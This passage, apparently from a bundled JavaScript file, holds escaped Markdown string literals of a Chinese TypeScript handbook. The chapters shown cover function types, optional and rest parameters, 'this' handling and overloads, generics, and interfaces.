function(x: number, y: number): number { return x + y; };\n```\n\n我们可以给每个参数添加类型之后再为函数本身添加返回值类型。 TypeScript能够根据返回语句自动推断出返回值类型，因此我们通常省略它。\n\n### 书写完整函数类型\n\n现在我们已经为函数指定了类型，下面让我们写出函数的完整类型。\n\n```typescript\nlet myAdd: (x:number, y:number) => number =\n    function(x: number, y: number): number { return x + y; };\n```\n\n函数类型包含两部分：参数类型和返回值类型。 当写出完整函数类型的时候，这两部分都是需要的。 我们以参数列表的形式写出参数类型，为每个参数指定一个名字和类型。 这个名字只是为了增加可读性。 我们也可以这么写：\n\n```typescript\nlet myAdd: (baseValue: number, increment: number) => number =\n    function(x: number, y: number): number { return x + y; };\n```\n\n只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。\n\n第二部分是返回值类型。 对于返回值，我们在函数和返回值类型之前使用\\(`=>`\\)符号，使之清晰明了。 如之前提到的，返回值类型是函数类型的必要部分，如果函数没有返回任何值，你也必须指定返回值类型为`void`而不能留空。\n\n函数的类型只是由参数类型和返回值组成的。 函数中使用的捕获变量不会体现在类型里。 实际上，这些变量是函数的隐藏状态并不是组成API的一部分。\n\n### 推断类型\n\n尝试这个例子的时候，你会注意到，就算仅在等式的一侧带有类型，TypeScript编译器仍可正确识别类型：\n\n```typescript\n// myAdd has the full function type\nlet myAdd = function(x: number, y: number): number { return x + y; };\n\n// The parameters `x` and `y` have the type number\nlet myAdd: (baseValue: number, increment: number) => number =\n    function(x, y) { return x + y; };\n```\n\n这叫做“按上下文归类”，是类型推论的一种。 它帮助我们更好地为程序指定类型。\n\n## 可选参数和默认参数\n\nTypeScript里的每个函数参数都是必须的。 这不是指不能传递`null`或`undefined`作为参数，而是说编译器检查用户是否为每个参数都传入了值。 编译器还会假设只有这些参数会被传递进函数。 简短地说，传递给一个函数的参数个数必须与函数期望的参数个数一致。\n\n```typescript\nfunction buildName(firstName: string, lastName: string) {\n    return firstName + " " + lastName;\n}\n\nlet result1 = buildName("Bob");                  // error, too few parameters\nlet result2 = buildName("Bob", "Adams", "Sr.");  // error, too many parameters\nlet result3 = buildName("Bob", "Adams");         // ah, just right\n```\n\nJavaScript里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是undefined。 在TypeScript里我们可以在参数名旁使用`?`实现可选参数的功能。 比如，我们想让last name是可选的：\n\n```typescript\nfunction buildName(firstName: string, lastName?: string) {\n    if (lastName)\n        return firstName + " " + lastName;\n    else\n        return firstName;\n}\n\nlet result1 = buildName("Bob");  // works correctly now\nlet result2 = buildName("Bob", "Adams", "Sr.");  // error, too many parameters\nlet result3 = buildName("Bob", "Adams");  // ah, just right\n```\n\n可选参数必须跟在必须参数后面。 如果上例我们想让first name是可选的，那么就必须调整它们的位置，把first name放在后面。\n\n在TypeScript里，我们也可以为参数提供一个默认值当用户没有传递这个参数或传递的值是`undefined`时。 它们叫做有默认初始化值的参数。 让我们修改上例，把last name的默认值设置为`"Smith"`。\n\n```typescript\nfunction buildName(firstName: string, lastName = "Smith") {\n    return firstName + " " + lastName;\n}\n\nlet result1 = buildName("Bob");                  // works correctly now, returns "Bob Smith"\nlet result2 = buildName("Bob", undefined);       // still works, also returns "Bob Smith"\nlet result3 = buildName("Bob", "Adams", "Sr.");  // error, too many parameters\nlet result4 = buildName("Bob", "Adams");         // ah, just right\n```\n\n在所有必须参数后面的带默认初始化的参数都是可选的，与可选参数一样，在调用函数的时候可以省略。 也就是说可选参数与末尾的默认参数共享参数类型。\n\n```typescript\nfunction buildName(firstName: string, lastName?: string) {\n    // ...\n}\n```\n\n和\n\n```typescript\nfunction buildName(firstName: string, lastName = "Smith") {\n    // ...\n}\n```\n\n共享同样的类型`(firstName: string, lastName?: string) => string`。 在函数类型中，默认参数的默认值不会显示，而只会显示它是一个可选参数。\n\n与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入`undefined`值来获得默认值。 例如，我们重写最后一个例子，让`firstName`是带默认值的参数：\n\n```typescript\nfunction buildName(firstName = "Will", lastName: string) {\n    return firstName + " " + lastName;\n}\n\nlet result1 = buildName("Bob");                  // error, too few parameters\nlet result2 = buildName("Bob", "Adams", "Sr.");  // error, too many parameters\nlet result3 = buildName("Bob", "Adams");         // okay and returns "Bob Adams"\nlet result4 = buildName(undefined, "Adams");     // okay and returns "Will Adams"\n```\n\n## 剩余参数\n\n必要参数，默认参数和可选参数有个共同点：它们表示某一个参数。 有时，你想同时操作多个参数，或者你并不知道会有多少参数传递进来。 在JavaScript里，你可以使用`arguments`来访问所有传入的参数。\n\n在TypeScript里，你可以把所有参数收集到一个变量里：\n\n```typescript\nfunction buildName(firstName: string, ...restOfName: string[]) {\n  return firstName + " " + restOfName.join(" ");\n}\n\nlet employeeName = buildName("Joseph", "Samuel", "Lucas", "MacKinzie");\n```\n\n剩余参数会被当做个数不限的可选参数。 可以一个都没有，同样也可以有任意个。 编译器创建参数数组，名字是你在省略号（`...`）后面给定的名字，你可以在函数体内使用这个数组。\n\n这个省略号也会在带有剩余参数的函数类型定义上使用到：\n\n```typescript\nfunction buildName(firstName: string, ...restOfName: string[]) {\n  return firstName + " " + restOfName.join(" ");\n}\n\nlet buildNameFun: (fname: string, ...rest: string[]) => string = buildName;\n```\n\n## `this`\n\n学习如何在JavaScript里正确使用`this`就好比一场成年礼。 由于TypeScript是JavaScript的超集，TypeScript程序员也需要弄清`this`工作机制并且当有bug的时候能够找出错误所在。 幸运的是，TypeScript能通知你错误地使用了`this`的地方。 如果你想了解JavaScript里的`this`是如何工作的，那么首先阅读Yehuda Katz写的[Understanding JavaScript Function Invocation and "this"](http://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/)。 Yehuda的文章详细的阐述了`this`的内部工作原理，因此我们这里只做简单介绍。\n\n### `this`和箭头函数\n\nJavaScript里，`this`的值在函数被调用的时候才会指定。 这是个既强大又灵活的特点，但是你需要花点时间弄清楚函数调用的上下文是什么。 但众所周知，这不是一件很简单的事，尤其是在返回一个函数或将函数当做参数传递的时候。\n\n下面看一个例子：\n\n```typescript\nlet deck = {\n    suits: ["hearts", "spades", "clubs", "diamonds"],\n    cards: Array(52),\n    createCardPicker: function() {\n        return function() {\n            let pickedCard = Math.floor(Math.random() * 52);\n            let pickedSuit = Math.floor(pickedCard / 13);\n\n            return {suit: this.suits[pickedSuit], card: pickedCard % 13};\n        }\n    }\n}\n\nlet cardPicker = deck.createCardPicker();\nlet pickedCard = cardPicker();\n\nalert("card: " + pickedCard.card + " of " + pickedCard.suit);\n```\n\n可以看到`createCardPicker`是个函数，并且它又返回了一个函数。 如果我们尝试运行这个程序，会发现它并没有弹出对话框而是报错了。 因为`createCardPicker`返回的函数里的`this`被设置成了`window`而不是`deck`对象。 因为我们只是独立的调用了`cardPicker()`。 顶级的非方法式调用会将`this`视为`window`。 （注意：在严格模式下，`this`为`undefined`而不是`window`）。\n\n为了解决这个问题，我们可以在函数被返回时就绑好正确的`this`。 这样的话，无论之后怎么使用它，都会引用绑定的‘deck’对象。 我们需要改变函数表达式来使用ECMAScript 6箭头语法。 箭头函数能保存函数创建时的`this`值，而不是调用时的值：\n\n```typescript\nlet deck = {\n    suits: ["hearts", "spades", "clubs", "diamonds"],\n    cards: Array(52),\n    createCardPicker: function() {\n        // NOTE: the line below is now an arrow function, allowing us to capture \'this\' right here\n        return () => {\n            let pickedCard = Math.floor(Math.random() * 52);\n            let pickedSuit = Math.floor(pickedCard / 13);\n\n            return {suit: this.suits[pickedSuit], card: pickedCard % 13};\n        }\n    }\n}\n\nlet cardPicker = deck.createCardPicker();\nlet pickedCard = cardPicker();\n\nalert("card: " + pickedCard.card + " of " + pickedCard.suit);\n```\n\n更好事情是，TypeScript会警告你犯了一个错误，如果你给编译器设置了`--noImplicitThis`标记。 它会指出`this.suits[pickedSuit]`里的`this`的类型为`any`。\n\n### `this`参数\n\n不幸的是，`this.suits[pickedSuit]`中的`this`的类型依旧为`any`。 这是因为`this`来自对象字面量里的函数表达式。 修改的方法是，提供一个显式的`this`参数。 `this`参数是个假的参数，它出现在参数列表的最前面：\n\n```typescript\nfunction f(this: void) {\n    // make sure `this` is unusable in this standalone function\n}\n```\n\n让我们往例子里添加一些接口，`Card` 和 `Deck`，让类型重用能够变得清晰简单些：\n\n```typescript\ninterface Card {\n    suit: string;\n    card: number;\n}\ninterface Deck {\n    suits: string[];\n    cards: number[];\n    createCardPicker(this: Deck): () => Card;\n}\nlet deck: Deck = {\n    suits: ["hearts", "spades", "clubs", "diamonds"],\n    cards: Array(52),\n    // NOTE: The function now explicitly specifies that its callee must be of type Deck\n    createCardPicker: function(this: Deck) {\n        return () => {\n            let pickedCard = Math.floor(Math.random() * 52);\n            let pickedSuit = Math.floor(pickedCard / 13);\n\n            return {suit: this.suits[pickedSuit], card: pickedCard % 13};\n        }\n    }\n}\n\nlet cardPicker = deck.createCardPicker();\nlet pickedCard = cardPicker();\n\nalert("card: " + pickedCard.card + " of " + pickedCard.suit);\n```\n\n现在TypeScript知道`createCardPicker`期望在某个`Deck`对象上调用。 也就是说`this`是`Deck`类型的，而非`any`，因此`--noImplicitThis`不会报错了。\n\n#### 回调函数里的`this`参数\n\n当你将一个函数传递到某个库函数里在稍后被调用时，你可能也见到过回调函数里的`this`会报错。 因为当回调函数被调用时，它会被当成一个普通函数调用，`this`将为`undefined`。 稍做改动，你就可以通过`this`参数来避免错误。 首先，库函数的作者要指定`this`的类型：\n\n```typescript\ninterface UIElement {\n    addClickListener(onclick: (this: void, e: Event) => void): void;\n}\n```\n\n`this: void`意味着`addClickListener`期望`onclick`是一个函数且它不需要一个`this`类型。 然后，为调用代码里的`this`添加类型注解：\n\n```typescript\nclass Handler {\n    info: string;\n    onClickBad(this: Handler, e: Event) {\n        // oops, used this here. using this callback would crash at runtime\n        this.info = e.message;\n    }\n}\nlet h = new Handler();\nuiElement.addClickListener(h.onClickBad); // error!\n```\n\n指定了`this`类型后，你显式声明`onClickBad`必须在`Handler`的实例上调用。 然后TypeScript会检测到`addClickListener`要求函数带有`this: void`。 改变`this`类型来修复这个错误：\n\n```typescript\nclass Handler {\n    info: string;\n    onClickGood(this: void, e: Event) {\n        // can\'t use this here because it\'s of type void!\n        console.log(\'clicked!\');\n    }\n}\nlet h = new Handler();\nuiElement.addClickListener(h.onClickGood);\n```\n\n因为`onClickGood`指定了`this`类型为`void`，因此传递`addClickListener`是合法的。 当然了，这也意味着不能使用`this.info`. 如果你两者都想要，你不得不使用箭头函数了：\n\n```typescript\nclass Handler {\n    info: string;\n    onClickGood = (e: Event) => { this.info = e.message }\n}\n```\n\n这是可行的因为箭头函数使用外层的`this`，所以你总是可以把它们传给期望`this: void`的函数。 缺点是每个`Handler`对象都会创建一个箭头函数。 另一方面，方法只会被创建一次，添加到`Handler`的原型链上。 它们在不同`Handler`对象间是共享的。\n\n## 重载\n\nJavaScript本身是个动态语言。 JavaScript里函数根据传入不同的参数而返回不同类型的数据是很常见的。\n\n```typescript\nlet suits = ["hearts", "spades", "clubs", "diamonds"];\n\nfunction pickCard(x): any {\n    // Check to see if we\'re working with an object/array\n    // if so, they gave us the deck and we\'ll pick the card\n    if (typeof x == "object") {\n        let pickedCard = Math.floor(Math.random() * x.length);\n        return pickedCard;\n    }\n    // Otherwise just let them pick the card\n    else if (typeof x == "number") {\n        let pickedSuit = Math.floor(x / 13);\n        return { suit: suits[pickedSuit], card: x % 13 };\n    }\n}\n\nlet myDeck = [{ suit: "diamonds", card: 2 }, { suit: "spades", card: 10 }, { suit: "hearts", card: 4 }];\nlet pickedCard1 = myDeck[pickCard(myDeck)];\nalert("card: " + pickedCard1.card + " of " + pickedCard1.suit);\n\nlet pickedCard2 = pickCard(15);\nalert("card: " + pickedCard2.card + " of " + pickedCard2.suit);\n```\n\n`pickCard`方法根据传入参数的不同会返回两种不同的类型。 如果传入的是代表纸牌的对象，函数作用是从中抓一张牌。 如果用户想抓牌，我们告诉他抓到了什么牌。 但是这怎么在类型系统里表示呢。\n\n方法是为同一个函数提供多个函数类型定义来进行函数重载。 编译器会根据这个列表去处理函数的调用。 下面我们来重载`pickCard`函数。\n\n```typescript\nlet suits = ["hearts", "spades", "clubs", "diamonds"];\n\nfunction pickCard(x: {suit: string; card: number; }[]): number;\nfunction pickCard(x: number): {suit: string; card: number; };\nfunction pickCard(x): any {\n    // Check to see if we\'re working with an object/array\n    // if so, they gave us the deck and we\'ll pick the card\n    if (typeof x == "object") {\n        let pickedCard = Math.floor(Math.random() * x.length);\n        return pickedCard;\n    }\n    // Otherwise just let them pick the card\n    else if (typeof x == "number") {\n        let pickedSuit = Math.floor(x / 13);\n        return { suit: suits[pickedSuit], card: x % 13 };\n    }\n}\n\nlet myDeck = [{ suit: "diamonds", card: 2 }, { suit: "spades", card: 10 }, { suit: "hearts", card: 4 }];\nlet pickedCard1 = myDeck[pickCard(myDeck)];\nalert("card: " + pickedCard1.card + " of " + pickedCard1.suit);\n\nlet pickedCard2 = pickCard(15);\nalert("card: " + pickedCard2.card + " of " + pickedCard2.suit);\n```\n\n这样改变后，重载的`pickCard`函数在调用的时候会进行正确的类型检查。\n\n为了让编译器能够选择正确的检查类型，它与JavaScript里的处理流程相似。 它查找重载列表，尝试使用第一个重载定义。 如果匹配的话就使用这个。 因此，在定义重载的时候，一定要把最精确的定义放在最前面。\n\n注意，`function pickCard(x): any`并不是重载列表的一部分，因此这里只有两个重载：一个是接收对象另一个接收数字。 以其它参数调用`pickCard`会产生错误。\n\n',cl="# 泛型\n\n## 介绍\n\n软件工程中，我们不仅要创建一致的定义良好的API，同时也要考虑可重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型，这在创建大型系统时为你提供了十分灵活的功能。\n\n在像C\\#和Java这样的语言中，可以使用`泛型`来创建可重用的组件，一个组件可以支持多种类型的数据。 这样用户就可以以自己的数据类型来使用组件。\n\n## 泛型之Hello World\n\n下面来创建第一个使用泛型的例子：identity函数。 这个函数会返回任何传入它的值。 你可以把这个函数当成是`echo`命令。\n\n不用泛型的话，这个函数可能是下面这样：\n\n```typescript\nfunction identity(arg: number): number {\n    return arg;\n}\n```\n\n或者，我们使用`any`类型来定义函数：\n\n```typescript\nfunction identity(arg: any): any {\n    return arg;\n}\n```\n\n使用`any`类型会导致这个函数可以接收任何类型的`arg`参数，这样就丢失了一些信息：传入的类型与返回的类型应该是相同的。 如果我们传入一个数字，我们只知道任何类型的值都有可能被返回。\n\n因此，我们需要一种方法使返回值的类型与传入参数的类型是相同的。 这里，我们使用了_类型变量_，它是一种特殊的变量，只用于表示类型而不是值。\n\n```typescript\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n```\n\n我们给identity添加了类型变量`T`。 `T`帮助我们捕获用户传入的类型（比如：`number`），之后我们就可以使用这个类型。 之后我们再次使用了`T`当做返回值类型。现在我们可以知道参数类型与返回值类型是相同的了。 这允许我们跟踪函数里使用的类型的信息。\n\n我们把这个版本的`identity`函数叫做泛型，因为它可以适用于多个类型。 不同于使用`any`，它不会丢失信息，像第一个例子那像保持准确性，传入数值类型并返回数值类型。\n\n我们定义了泛型函数后，可以用两种方法使用。 第一种是，传入所有的参数，包含类型参数：\n\n```typescript\nlet output = identity<string>(\"myString\");  // type of output will be 'string'\n```\n\n这里我们明确的指定了`T`是`string`类型，并做为一个参数传给函数，使用了`<>`括起来而不是`()`。\n\n第二种方法更普遍。利用了_类型推论_ -- 即编译器会根据传入的参数自动地帮助我们确定T的类型：\n\n```typescript\nlet output = identity(\"myString\");  // type of output will be 'string'\n```\n\n注意我们没必要使用尖括号（`<>`）来明确地传入类型；编译器可以查看`myString`的值，然后把`T`设置为它的类型。 类型推论帮助我们保持代码精简和高可读性。如果编译器不能够自动地推断出类型的话，只能像上面那样明确的传入T的类型，在一些复杂的情况下，这是可能出现的。\n\n## 使用泛型变量\n\n使用泛型创建像`identity`这样的泛型函数时，编译器要求你在函数体必须正确的使用这个通用的类型。 换句话说，你必须把这些参数当做是任意或所有类型。\n\n看下之前`identity`例子：\n\n```typescript\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n```\n\n如果我们想同时打印出`arg`的长度。 我们很可能会这样做：\n\n```typescript\nfunction loggingIdentity<T>(arg: T): T {\n    console.log(arg.length);  // Error: T doesn't have .length\n    return arg;\n}\n```\n\n如果这么做，编译器会报错说我们使用了`arg`的`.length`属性，但是没有地方指明`arg`具有这个属性。 记住，这些类型变量代表的是任意类型，所以使用这个函数的人可能传入的是个数字，而数字是没有`.length`属性的。\n\n现在假设我们想操作`T`类型的数组而不直接是`T`。由于我们操作的是数组，所以`.length`属性是应该存在的。 我们可以像创建其它数组一样创建这个数组：\n\n```typescript\nfunction loggingIdentity<T>(arg: T[]): T[] {\n    console.log(arg.length);  // Array has a .length, so no more error\n    return arg;\n}\n```\n\n你可以这样理解`loggingIdentity`的类型：泛型函数`loggingIdentity`，接收类型参数`T`和参数`arg`，它是个元素类型是`T`的数组，并返回元素类型是`T`的数组。 如果我们传入数字数组，将返回一个数字数组，因为此时`T`的的类型为`number`。 这可以让我们把泛型变量T当做类型的一部分使用，而不是整个类型，增加了灵活性。\n\n我们也可以这样实现上面的例子：\n\n```typescript\nfunction loggingIdentity<T>(arg: Array<T>): Array<T> {\n    console.log(arg.length);  // Array has a .length, so no more error\n    return arg;\n}\n```\n\n使用过其它语言的话，你可能对这种语法已经很熟悉了。 在下一节，会介绍如何创建自定义泛型像`Array<T>`一样。\n\n## 泛型类型\n\n上一节，我们创建了identity通用函数，可以适用于不同的类型。 在这节，我们研究一下函数本身的类型，以及如何创建泛型接口。\n\n泛型函数的类型与非泛型函数的类型没什么不同，只是有一个类型参数在最前面，像函数声明一样：\n\n```typescript\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\nlet myIdentity: <T>(arg: T) => T = identity;\n```\n\n我们也可以使用不同的泛型参数名，只要在数量上和使用方式上能对应上就可以。\n\n```typescript\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\nlet myIdentity: <U>(arg: U) => U = identity;\n```\n\n我们还可以使用带有调用签名的对象字面量来定义泛型函数：\n\n```typescript\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\nlet myIdentity: {<T>(arg: T): T} = identity;\n```\n\n这引导我们去写第一个泛型接口了。 我们把上面例子里的对象字面量拿出来做为一个接口：\n\n```typescript\ninterface GenericIdentityFn {\n    <T>(arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\nlet myIdentity: GenericIdentityFn = identity;\n```\n\n一个相似的例子，我们可能想把泛型参数当作整个接口的一个参数。 这样我们就能清楚的知道使用的具体是哪个泛型类型（比如：`Dictionary<string>而不只是Dictionary`）。 这样接口里的其它成员也能知道这个参数的类型了。\n\n```typescript\ninterface GenericIdentityFn<T> {\n    (arg: T): T;\n}\n\nfunction identity<T>(arg: T): T {\n    return arg;\n}\n\nlet myIdentity: GenericIdentityFn<number> = identity;\n```\n\n注意，我们的示例做了少许改动。 不再描述泛型函数，而是把非泛型函数签名作为泛型类型一部分。 当我们使用`GenericIdentityFn`的时候，还得传入一个类型参数来指定泛型类型（这里是：`number`），锁定了之后代码里使用的类型。 对于描述哪部分类型属于泛型部分来说，理解何时把参数放在调用签名里和何时放在接口上是很有帮助的。\n\n除了泛型接口，我们还可以创建泛型类。 注意，无法创建泛型枚举和泛型命名空间。\n\n## 泛型类\n\n泛型类看上去与泛型接口差不多。 泛型类使用（`<>`）括起泛型类型，跟在类名后面。\n\n```typescript\nclass GenericNumber<T> {\n    zeroValue: T;\n    add: (x: T, y: T) => T;\n}\n\nlet myGenericNumber = new GenericNumber<number>();\nmyGenericNumber.zeroValue = 0;\nmyGenericNumber.add = function(x, y) { return x + y; };\n```\n\n`GenericNumber`类的使用是十分直观的，并且你可能已经注意到了，没有什么去限制它只能使用`number`类型。 也可以使用字符串或其它更复杂的类型。\n\n```typescript\nlet stringNumeric = new GenericNumber<string>();\nstringNumeric.zeroValue = \"\";\nstringNumeric.add = function(x, y) { return x + y; };\n\nconsole.log(stringNumeric.add(stringNumeric.zeroValue, \"test\"));\n```\n\n与接口一样，直接把泛型类型放在类后面，可以帮助我们确认类的所有属性都在使用相同的类型。\n\n我们在[类](classes.md)那节说过，类有两部分：静态部分和实例部分。 泛型类指的是实例部分的类型，所以类的静态属性不能使用这个泛型类型。\n\n## 泛型约束\n\n你应该会记得之前的一个例子，我们有时候想操作某类型的一组值，并且我们知道这组值具有什么样的属性。 在`loggingIdentity`例子中，我们想访问`arg`的`length`属性，但是编译器并不能证明每种类型都有`length`属性，所以就报错了。\n\n```typescript\nfunction loggingIdentity<T>(arg: T): T {\n    console.log(arg.length);  // Error: T doesn't have .length\n    return arg;\n}\n```\n\n相比于操作any所有类型，我们想要限制函数去处理任意带有`.length`属性的所有类型。 只要传入的类型有这个属性，我们就允许，就是说至少包含这一属性。 为此，我们需要列出对于T的约束要求。\n\n为此，我们定义一个接口来描述约束条件。 创建一个包含`.length`属性的接口，使用这个接口和`extends`关键字来实现约束：\n\n```typescript\ninterface Lengthwise {\n    length: number;\n}\n\nfunction loggingIdentity<T extends Lengthwise>(arg: T): T {\n    console.log(arg.length);  // Now we know it has a .length property, so no more error\n    return arg;\n}\n```\n\n现在这个泛型函数被定义了约束，因此它不再是适用于任意类型：\n\n```typescript\nloggingIdentity(3);  // Error, number doesn't have a .length property\n```\n\n我们需要传入符合约束类型的值，必须包含必须的属性：\n\n```typescript\nloggingIdentity({length: 10, value: 3});\n```\n\n### 在泛型约束中使用类型参数\n\n你可以声明一个类型参数，且它被另一个类型参数所约束。 比如，现在我们想要用属性名从对象里获取这个属性。 并且我们想要确保这个属性存在于对象`obj`上，因此我们需要在这两个类型之间使用约束。\n\n```typescript\nfunction getProperty<T, K extends keyof T>(obj: T, key: K) {\n    return obj[key];\n}\n\nlet x = { a: 1, b: 2, c: 3, d: 4 };\n\ngetProperty(x, \"a\"); // okay\ngetProperty(x, \"m\"); // error: Argument of type 'm' isn't assignable to 'a' | 'b' | 'c' | 'd'.\n```\n\n### 在泛型里使用类类型\n\n在TypeScript使用泛型创建工厂函数时，需要引用构造函数的类类型。比如，\n\n```typescript\nfunction create<T>(c: {new(): T; }): T {\n    return new c();\n}\n```\n\n一个更高级的例子，使用原型属性推断并约束构造函数与类实例的关系。\n\n```typescript\nclass BeeKeeper {\n    hasMask: boolean;\n}\n\nclass ZooKeeper {\n    nametag: string;\n}\n\nclass Animal {\n    numLegs: number;\n}\n\nclass Bee extends Animal {\n    keeper: BeeKeeper;\n}\n\nclass Lion extends Animal {\n    keeper: ZooKeeper;\n}\n\nfunction createInstance<A extends Animal>(c: new () => A): A {\n    return new c();\n}\n\ncreateInstance(Lion).keeper.nametag;  // typechecks!\ncreateInstance(Bee).keeper.hasMask;   // typechecks!\n```\n\n",pl='# 接口\n\n## 介绍\n\nTypeScript 的核心原则之一是对值所具有的_结构_进行类型检查。 它有时被称做“鸭式辨型法”或“结构性子类型化”。 在 TypeScript 里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。\n\n## 接口初探\n\n下面通过一个简单示例来观察接口是如何工作的：\n\n```typescript\nfunction printLabel(labeledObj: { label: string }) {\n  console.log(labeledObj.label);\n}\n\nlet myObj = { size: 10, label: "Size 10 Object" };\nprintLabel(myObj);\n```\n\n类型检查器会查看`printLabel`的调用。 `printLabel`有一个参数，并要求这个对象参数有一个名为`label`类型为`string`的属性。 需要注意的是，我们传入的对象参数实际上会包含很多属性，但是编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。 然而，有些时候 TypeScript 却并不会这么宽松，我们下面会稍做讲解。\n\n下面我们重写上面的例子，这次使用接口来描述：必须包含一个`label`属性且类型为`string`：\n\n```typescript\ninterface LabeledValue {\n  label: string;\n}\n\nfunction printLabel(labeledObj: LabeledValue) {\n  console.log(labeledObj.label);\n}\n\nlet myObj = { size: 10, label: "Size 10 Object" };\nprintLabel(myObj);\n```\n\n`LabeledValue`接口就好比一个名字，用来描述上面例子里的要求。 它代表了有一个`label`属性且类型为`string`的对象。 需要注意的是，我们在这里并不能像在其它语言里一样，说传给`printLabel`的对象实现了这个接口。我们只会去关注值的外形。 只要传入的对象满足上面提到的必要条件，那么它就是被允许的。\n\n还有一点值得提的是，类型检查器不会去检查属性的顺序，只要相应的属性存在并且类型也是对的就可以。\n\n## 可选属性\n\n接口里的属性不全都是必需的。 有些是只在某些条件下存在，或者根本不存在。 可选属性在应用“option bags”模式时很常用，即给函数传入的参数对象中只有部分属性赋值了。\n\n下面是应用了“option bags”的例子：\n\n```typescript\ninterface SquareConfig {\n  color?: string;\n  width?: number;\n}\n\nfunction createSquare(config: SquareConfig): { color: string; area: number } {\n  let newSquare = { color: "white", area: 100 };\n  if (config.color) {\n    newSquare.color = config.color;\n  }\n  if (config.width) {\n    newSquare.area = config.width * config.width;\n  }\n  return newSquare;\n}\n\nlet mySquare = createSquare({ color: "black" });\n```\n\n带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个`?`符号。\n\n可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。 比如，我们故意将`createSquare`里的`color`属性名拼错，就会得到一个错误提示：\n\n```typescript\ninterface SquareConfig {\n  color?: string;\n  width?: number;\n}\n\nfunction createSquare(config: SquareConfig): { color: string; area: number } {\n  let newSquare = { color: "white", area: 100 };\n  if (config.clor) {\n    // Error: Property \'clor\' does not exist on type \'SquareConfig\'\n    newSquare.color = config.clor;\n  }\n  if (config.width) {\n    newSquare.area = config.width * config.width;\n  }\n  return newSquare;\n}\n\nlet mySquare = createSquare({ color: "black" });\n```\n\n## 只读属性\n\n一些对象属性只能在对象刚刚创建的时候修改其值。 你可以在属性名前用`readonly`来指定只读属性:\n\n```typescript\ninterface Point {\n  readonly x: number;\n  readonly y: number;\n}\n```\n\n你可以通过赋值一个对象字面量来构造一个`Point`。 赋值后，`x`和`y`再也不能被改变了。\n\n```typescript\nlet p1: Point = { x: 10, y: 20 };\np1.x = 5; // error!\n```\n\nTypeScript 具有`ReadonlyArray<T>`类型，它与`Array<T>`相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改：\n\n```typescript\nlet a: number[] = [1, 2, 3, 4];\nlet ro: ReadonlyArray<number> = a;\nro[0] = 12; // error!\nro.push(5); // error!\nro.length = 100; // error!\na = ro; // error!\n```\n\n上面代码的最后一行，可以看到就算把整个`ReadonlyArray`赋值到一个普通数组也是不可以的。 但是你可以用类型断言重写：\n\n```typescript\na = ro as number[];\n```\n\n### `readonly` vs `const`\n\n最简单判断该用`readonly`还是`const`的方法是看要把它做为变量使用还是做为一个属性。 做为变量使用的话用`const`，若做为属性则使用`readonly`。\n\n## 额外的属性检查\n\n我们在第一个例子里使用了接口，TypeScript 让我们传入`{ size: number; label: string; }`到仅期望得到`{ label: string; }`的函数里。 我们已经学过了可选属性，并且知道他们在“option bags”模式里很有用。\n\n然而，天真地将这两者结合的话就会像在 JavaScript 里那样搬起石头砸自己的脚。比如，拿`createSquare`例子来说：\n\n```typescript\ninterface SquareConfig {\n  color?: string;\n  width?: number;\n}\n\nfunction createSquare(config: SquareConfig): { color: string; area: number } {\n  // ...\n}\n\nlet mySquare = createSquare({ colour: "red", width: 100 });\n```\n\n注意传入`createSquare`的参数拼写为`colour`而不是`color`。 在 JavaScript 里，这会默默地失败。\n\n你可能会争辩这个程序已经正确地类型化了，因为`width`属性是兼容的，不存在`color`属性，而且额外的`colour`属性是无意义的。\n\n然而，TypeScript 会认为这段代码可能存在 bug。 对象字面量会被特殊对待而且会经过_额外属性检查_，当将它们赋值给变量或作为参数传递的时候。 如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。\n\n```typescript\n// error: Object literal may only specify known properties, but \'colour\' does not exist in type \'SquareConfig\'. Did you mean to write \'color\'?\nlet mySquare = createSquare({ colour: "red", width: 100 });\n```\n\n绕开这些检查非常简单。 最简便的方法是使用类型断言：\n\n```typescript\nlet mySquare = createSquare({ width: 100, opacity: 0.5 } as SquareConfig);\n```\n\n然而，最佳的方式是能够添加一个字符串索引签名，前提是你能够确定这个对象可能具有某些做为特殊用途使用的额外属性。 如果`SquareConfig`带有上面定义的类型的`color`和`width`属性，并且_还会_带有任意数量的其它属性，那么我们可以这样定义它：\n\n```typescript\ninterface SquareConfig {\n  color?: string;\n  width?: number;\n  [propName: string]: any;\n}\n```\n\n我们稍后会讲到索引签名，但在这我们要表示的是`SquareConfig`可以有任意数量的属性，并且只要它们不是`color`和`width`，那么就无所谓它们的类型是什么。\n\n还有最后一种跳过这些检查的方式，这可能会让你感到惊讶，它就是将这个对象赋值给一个另一个变量： 因为`squareOptions`不会经过额外属性检查，所以编译器不会报错。\n\n```typescript\nlet squareOptions = { colour: "red", width: 100 };\nlet mySquare = createSquare(squareOptions);\n```\n\n上面的方法只在`squareOptions`和`SquareConfig`之间有共同的属性时才好用。 在这个例子中，这个属性为`width`。如果变量间不存在共同的对象属性将会报错。例如：\n\n```typescript\nlet squareOptions = { colour: "red" };\nlet mySquare = createSquare(squareOptions);\n```\n\n要留意，在像上面一样的简单代码里，你可能不应该去绕开这些检查。 对于包含方法和内部状态的复杂对象字面量来讲，你可能需要使用这些技巧，但是大部额外属性检查错误是真正的 bug。 就是说你遇到了额外类型检查出的错误，比如“option bags”，你应该去审查一下你的类型声明。 在这里，如果支持传入`color`或`colour`属性到`createSquare`，你应该修改`SquareConfig`定义来体现出这一点。\n\n## 函数类型\n\n接口能够描述 JavaScript 中对象拥有的各种各样的外形。 